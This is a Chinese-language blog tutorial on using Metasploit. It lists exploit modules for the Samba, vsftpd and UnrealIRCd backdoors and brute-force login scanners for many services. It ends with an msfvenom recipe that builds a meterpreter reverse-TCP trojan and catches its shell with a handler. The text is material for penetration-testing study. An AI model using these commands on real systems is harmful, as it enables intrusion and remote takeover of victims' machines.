@@ -1,0 +1,415 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Metasploit使用 | txjg blog</title>
+  <meta name="author" content="txjg">
+  
+  <meta name="description" content="Metasploit主要作用：漏洞验证(poc)
+漏洞利用(exploit)
+内网渗透等
+metasploit相关术语:exploit：攻击
+	通过利用msf中的脚本对目标系统实施精准打击或漏洞验证
+payload:攻击载荷
+	攻击载荷是在渗透攻击成功后促使目标系统运行的一段植入代码
+listene">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="Metasploit使用"/>
+  <meta property="og:site_name" content="txjg blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="txjg blog" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">  
+  <link rel="stylesheet" href="/css/sidenav.css" media="screen" type="text/css">  
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body id="body" data-spy="scroll" data-target=".toc">
+  <div class="container" id="container">
+	<div class="content">
+	  <div class="page-header">		
+  <h1><a class="brand" href="/">txjg blog</a><span class="split"></span><span class="title">Metasploit使用</span><span class="date" id="title-date"><i class="fa fa-clock-o"></i> 2021-12-13</span></h1>
+</div>		
+
+<div class="row page">
+  <!-- cols -->	
+  
+  
+
+  
+	<div class="col-md-12">
+	  
+
+	  <!-- content -->
+	  <h1 id="Metasploit主要作用："><a href="#Metasploit主要作用：" class="headerlink" title="Metasploit主要作用："></a>Metasploit主要作用：</h1><pre class="line-numbers language-none"><code class="language-none">漏洞验证(poc)
+漏洞利用(exploit)
+内网渗透等<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<h1 id="metasploit相关术语"><a href="#metasploit相关术语" class="headerlink" title="metasploit相关术语:"></a>metasploit相关术语:</h1><pre class="line-numbers language-none"><code class="language-none">exploit：攻击
+	通过利用msf中的脚本对目标系统实施精准打击或漏洞验证
+payload:攻击载荷
+	攻击载荷是在渗透攻击成功后促使目标系统运行的一段植入代码
+listener:监听器
+	生成木马之后发给受害主机，监听反弹木马连入本机<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h1 id="metasploit所在目录："><a href="#metasploit所在目录：" class="headerlink" title="metasploit所在目录："></a>metasploit所在目录：</h1><pre class="line-numbers language-none"><code class="language-none">&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h1 id="metasploit所在目录目录内容："><a href="#metasploit所在目录目录内容：" class="headerlink" title="metasploit所在目录目录内容："></a>metasploit所在目录目录内容：</h1><pre class="line-numbers language-none"><code class="language-none">data目录			#msf攻击过程中使用的一些文件，如字典文件等
+	&#x2F;data&#x2F;exploits&#x2F;		#DLL和可执行文件
+scripts目录			#主要包含一些攻击需要用到的脚本
+	&#x2F;scripts&#x2F;meterpreter&#x2F;	#ruby脚本
+	&#x2F;scripts&#x2F;ps&#x2F;		#powershell脚本
+	&#x2F;scripts&#x2F;resource&#x2F;	#rc文件
+	&#x2F;scripts&#x2F;shell		#ruby脚本
+tools目录			#存放着大量的实用工具
+	&#x2F;tools&#x2F;exploit&#x2F;		#ruby脚本
+	&#x2F;tools&#x2F;memdump&#x2F;		#可执行文件
+	&#x2F;tools&#x2F;password&#x2F;	#ruby脚本
+plugins目录			#集成了第三方的插件，如sqlmap,nessus等
+modules目录			#msf重要模块
+	&#x2F;modules&#x2F;auxiliary&#x2F;	#漏洞辅助模块，多用于扫描
+	&#x2F;modules&#x2F;encoders&#x2F;	#编码器模块，对payloads进行编码
+	&#x2F;modules&#x2F;evasion&#x2F;	#创建反杀毒软件的木马
+	&#x2F;modules&#x2F;exploits&#x2F;	#攻击模块，实施精准打击
+	&#x2F;modules&#x2F;payloads&#x2F;	#漏洞载荷模块，通常作用是为渗透测试者打开在目标系统上的控制会话连接
+	modules&#x2F;nops&#x2F;		#空指令模块，最典型的空指令就是空操作
+	
+	注：在msf中，所有的模块都是通过ruby语言进行编写的<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h1 id="启动metasploit"><a href="#启动metasploit" class="headerlink" title="启动metasploit:"></a>启动metasploit:</h1><pre class="line-numbers language-none"><code class="language-none">启动之前要开启postgresql数据库服务：
+	service postgresql start
+	或
+	&#x2F;etc&#x2F;init.d&#x2F;postgresql start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<h1 id="metasploit图形化界面："><a href="#metasploit图形化界面：" class="headerlink" title="metasploit图形化界面："></a>metasploit图形化界面：</h1><pre class="line-numbers language-none"><code class="language-none">armitage
+	安装后需要：msfdb init<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h1 id="metasploit常用命令："><a href="#metasploit常用命令：" class="headerlink" title="metasploit常用命令："></a>metasploit常用命令：</h1><p>show命令：</p>
+<pre class="line-numbers language-none"><code class="language-none">show exploits		#显示所有的攻击模块
+show auxiliary		#显示所有的辅助模块
+show targets		#显示攻击的目标
+使用模块:use module_name
+	use exp(攻击模块)
+		show payloads		#显示当前模块可用的攻击载荷
+		show options		#显示当前模块所需设置的攻击参数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>search命令：</p>
+<pre class="line-numbers language-none"><code class="language-none">search &lt;关键词&gt;				#检索所需要的模块
+search &lt;关键词&gt; type:exploit		#检索所需要的攻击模块
+search &lt;关键词&gt; type:auxiliary		#检索所需要的辅助模块<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>use命令：</p>
+<pre class="line-numbers language-none"><code class="language-none">use module_name			#使用模块(攻击模块或辅助模块)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>info命令：</p>
+<pre class="line-numbers language-none"><code class="language-none">info module_name		#显示该模块详细信息<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>set、unset命令：</p>
+<pre class="line-numbers language-none"><code class="language-none">set target &lt;目标名&gt;		#设置攻击的目标
+set payload payload_name		#使用攻击载荷
+set &lt;参数名&gt; &lt;值&gt;		#设置该模块所需参数
+unset &lt;参数名&gt;			#取消该参数的值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>unset -g 命令：</p>
+<pre class="line-numbers language-none"><code class="language-none">unset -g &lt;参数1&gt; &lt;参数2&gt; &lt;...&gt;		#批量取消参数的值<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>save命令：</p>
+<pre class="line-numbers language-none"><code class="language-none">使用save命令对设置的参数进行保存，在下次启动后可以直接使用<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>run、exploit命令：</p>
+<pre class="line-numbers language-none"><code class="language-none">run
+或
+exploit				#实施攻击<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>banner命令：</p>
+<pre class="line-numbers language-none"><code class="language-none">banner			#切换msf启动界面图形<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h1 id="Samba-MS-RPC-shell命令注入漏洞"><a href="#Samba-MS-RPC-shell命令注入漏洞" class="headerlink" title="Samba MS-RPC shell命令注入漏洞:"></a>Samba MS-RPC shell命令注入漏洞:</h1><ul>
+<li>漏洞产生原因：传递通过MS-RPC提供的未过滤的用户输入在调用定义的外部脚本时调用&#x2F;bin&#x2F;sh,在smb.conf中，导致允许远程命令执行</li>
+<li>攻击模块：<pre class="line-numbers language-none"><code class="language-none">exploit&#x2F;multi&#x2F;samba&#x2F;usermap_script<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+</ul>
+<h1 id="Vsftpd源码包后门漏洞："><a href="#Vsftpd源码包后门漏洞：" class="headerlink" title="Vsftpd源码包后门漏洞："></a>Vsftpd源码包后门漏洞：</h1><ul>
+<li>漏洞产生原因：在特定版本的vsftpd服务器程序中，被人恶意植入代码，当用户名以“:)”为结尾，服务器就会在6200端口监听，并且能够执行任意恶意代码</li>
+<li>攻击模块:<pre class="line-numbers language-none"><code class="language-none">exploit&#x2F;unix&#x2F;ftp&#x2F;vsftpd_234_backdoor<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+</ul>
+<h1 id="UnrealiRCd后门漏洞："><a href="#UnrealiRCd后门漏洞：" class="headerlink" title="UnrealiRCd后门漏洞："></a>UnrealiRCd后门漏洞：</h1><ul>
+<li>漏洞产生原因：在2009年11月到2010年6月间分布于某些镜面站点的UnrealiRCd,在DEBUG3_DOLOG_SYSTEM宏中包含外部引入的恶意代码，远程攻击者就能够执行任意代码</li>
+<li>攻击模块：<pre class="line-numbers language-none"><code class="language-none">exploit&#x2F;unix&#x2F;irc&#x2F;unreal_ircd_3281_backdoor<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+</ul>
+<h1 id="Metasploit对各类密码进行破解："><a href="#Metasploit对各类密码进行破解：" class="headerlink" title="Metasploit对各类密码进行破解："></a>Metasploit对各类密码进行破解：</h1><ul>
+<li>FTP服务：文件传输协议，是用于在网络上进行文件传输的一套标准协议。破解成功之后可查看是否有文件上传权限，若有，可进一步利用，若没有，则可以获取一些敏感数据<ul>
+<li>默认端口：21</li>
+<li>攻击模块：  <pre class="line-numbers language-none"><code class="language-none">auxiliary&#x2F;scanner&#x2F;ftp&#x2F;ftp_login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+</ul>
+</li>
+<li>TELNET服务：telnet协议是TCP&#x2F;IP协议族的一员，是internet远程登录服务的标准协议和主要方式，传输方式为明文传输<ul>
+<li>默认端口:23</li>
+<li>攻击模块：   <pre class="line-numbers language-none"><code class="language-none">auxiliary&#x2F;scanner&#x2F;telnet&#x2F;telnet_login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+</ul>
+</li>
+<li>VNC服务：VNC(Virtual Network Console)是虚拟网络控制台的缩写，是一款远程控制工具<ul>
+<li>默认端口：5900</li>
+<li>攻击模块：  <pre class="line-numbers language-none"><code class="language-none">auxiliary&#x2F;scanner&#x2F;vnc&#x2F;vnc_login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+</ul>
+</li>
+<li>Samba服务：Samba是在linux和unix系统上实现smb协议的一个免费软件，是一种在局域网上共享文件和打印机的一种通信协议<ul>
+<li>默认端口：445</li>
+<li>攻击模块：  <pre class="line-numbers language-none"><code class="language-none">auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+</ul>
+</li>
+<li>SSH服务：SSH为建立在应用层基础上的安全协议，数据加密传输<ul>
+<li>默认端口:22</li>
+<li>攻击模块：  <pre class="line-numbers language-none"><code class="language-none">auxiliary&#x2F;scanner&#x2F;ssh&#x2F;ssh_login
+auxiliary&#x2F;scanner&#x2F;ssh&#x2F;ssh_login_pubkey<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
+</ul>
+</li>
+<li>MYSQL服务：MYSQL是一个关系型数据库管理系统，以root登录之后可执行系统命令<ul>
+<li>默认端口：3306</li>
+<li>攻击模块：  <pre class="line-numbers language-none"><code class="language-none">auxiliary&#x2F;scanner&#x2F;mysql&#x2F;mysql_login
+注：使用MySQL口令破解模块，这里一定要自定义一个字典。尽管它选项required是no,但是还是需要进行配置<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
+</ul>
+</li>
+<li>MSSQL服务：MSSQL(sql server)是一个关系型数据库管理系统，以sa登录之后可以使用xp_cmdshell执行系统命令<ul>
+<li>默认端口：1433</li>
+<li>攻击模块：  <pre class="line-numbers language-none"><code class="language-none">auxiliary&#x2F;scanner&#x2F;mssql&#x2F;mssql_login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+</ul>
+</li>
+<li>Oracle服务：oracle是一个关系型数据库管理系统<ul>
+<li>默认端口：1521</li>
+<li>攻击模块：  <pre class="line-numbers language-none"><code class="language-none">auxiliary&#x2F;scanner&#x2F;oracle&#x2F;oracle_login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+</ul>
+</li>
+<li>Postgresql服务：postgresql是一个关系型数据库管理系统<ul>
+<li>默认端口：5432</li>
+<li>攻击模块：  <pre class="line-numbers language-none"><code class="language-none">auxiliary&#x2F;scanner&#x2F;postgres&#x2F;postgres_login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+</ul>
+</li>
+<li>HTTP登录认证(路由器)：<ul>
+<li>支持的路由器：dlink</li>
+<li>默认端口：80</li>
+<li>攻击模块：  <pre class="line-numbers language-none"><code class="language-none">auxiliary&#x2F;scanner&#x2F;http&#x2F;dlink_dir_300_615_http_login
+auxiliary&#x2F;scanner&#x2F;http&#x2F;dlink_dir_session_cgi_http_login
+auxiliary&#x2F;scanner&#x2F;http&#x2F;dlink_dir_615h_http_login<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li>
+</ul>
+</li>
+<li>PcAnyWhere:pcanywhere是一款远程控制软件，你可以将自己的电脑当成主控端去控制远方另一台同样安装有Pcanywhere的电脑(被控端)<ul>
+<li>默认端口：5631</li>
+<li>攻击模块：  <pre class="line-numbers language-none"><code class="language-none">auxiliary&#x2F;scanner&#x2F;pcanywhere&#x2F;pcanywhere_login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+</ul>
+</li>
+<li>FTP匿名登录：<ul>
+<li>使用用户名为anonymous登录ftp服务器</li>
+<li>默认端口：21</li>
+<li>攻击模块：  <pre class="line-numbers language-none"><code class="language-none">auxiliary&#x2F;scanner&#x2F;ftp&#x2F;anonymous<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+</ul>
+</li>
+<li>Tomcat登录破解：<ul>
+<li>默认端口：8080</li>
+<li>攻击模块：  <pre class="line-numbers language-none"><code class="language-none">auxiliary&#x2F;scanner&#x2F;http&#x2F;tomcat_mgr_login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+</ul>
+</li>
+</ul>
+<h1 id="Metasploit生成木马："><a href="#Metasploit生成木马：" class="headerlink" title="Metasploit生成木马："></a>Metasploit生成木马：</h1><p>生成工具：msfvenom<br>原理：msfvenom是msfpayload、msfencode的结合体，利用msfvenom生成木马程序，让木马程序在目标机器上运行，在本地监听上线<br>msfvenom命令：</p>
+<pre class="line-numbers language-none"><code class="language-none">-p	--payload			#使用指定的payload
+-l	--list [module_type]		#列出模块类型所有的模块,模块类型包括：payloads, encoders, nops, platforms, archs, encrypt, formats, all
+-n	--nopsled			#在payload上添加一个[长度]大小的nopsled
+-f	--format			#指定payload输出格式，如exe等
+-e	--encoder			#使用编码器
+-a	--arch				#指定payload架构(x86、x64)
+--platform				#指定payload平台
+-s	--space				#指定最终payload的最大长度
+-b	--bad-chars			#避免使用的字符，如：“\x00\xff”
+-i	--iterations			#指定payload的编码次数
+-c	--add-code			#指定要包含的额外的win32 shellcode文件（路径）
+-x	--template			#指定一个自定义可执行文件作为模板使用
+-k	--keep				#保留--template行为并将有效负载注入为一个新线程
+-o	--out				#保存payload到一个文件中
+-v	--var-name			#指定用于某些输出格式的自定义变量名
+-h	--help				#显示帮助信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>例：msf生成一个木马并进行远控：</p>
+<pre class="line-numbers language-none"><code class="language-none">（1）msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;&lt;your ip&gt; lport&#x3D;&lt;your port&gt; -f exe -o hdy.exe		#生成一个hdy.exe木马
+	注：	lhost:攻击机IP
+		lport:攻击机端口
+（2）use exploit&#x2F;multi&#x2F;handler					#使用通用payload处理程序
+	 set payload windows&#x2F;meterpreter&#x2F;reverse_tcp		#指定生成的木马程序使用的payload
+	 set lhost &lt;your ip&gt;					#攻击机的IP
+	 set lport &lt;your port&gt;					#攻击机的端口
+	 run							#运行
+ (3)在靶机上运行生成的木马
+ (4)成功的获取靶机shell:
+ 	
+ 	sysinfo		#获取系统信息
+	shell		#输入shell进入交互式CMD
+			注：如果乱码，使用“chcp 65001”命令进行修正<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+	  
+
+	  <div>
+  		<center>
+		  <div class="pagination">
+<ul class="pagination">
+	
+	
+	
+	
+	
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+			
+		
+	
+		
+			
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+			
+		
+	
+		
+	
+		
+	
+		
+	
+		
+			
+			
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+	
+	
+		<li class="prev"><a href="/2021/12/15/Sqlmap%E4%BD%BF%E7%94%A8/" class="alignleft prev"><i class="fa fa-arrow-circle-o-left"></i>prev</a></li>
+	
+	<li><a href="/"><i class="fa fa-archive"></i>Home</a></li>
+	
+		<li class="next disabled"><a>next<i class="fa fa-arrow-circle-o-right"></i></a></li>
+	
+</ul>
+</div>
+
+		</center>
+	  </div>
+	  
+	</div> <!-- col-md-9/col-md-12 -->
+	
+  </div><!-- row -->
+
+	</div>
+  </div>
+  <div class="container-narrow">
+	<footer> <p>
+  &copy; 2022 txjg
+  
+      with help from <a href="http://zespia.tw/hexo/" target="_blank">Hexo</a> and <a href="http://getbootstrap.com/" target="_blank">Twitter Bootstrap</a>. Theme by <a target="_blank" rel="noopener" href="http://github.com/wzpan/hexo-theme-wixo/">Wixo</a>.    
+</p> </footer>
+  </div> <!-- container-narrow -->
+  
+<a id="gotop" href="#">   
+  <span>▲</span> 
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/jquery.tableofcontents.min.js"></script>
+<script src="/js/tocgenerator.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+
+</body>
+</html>
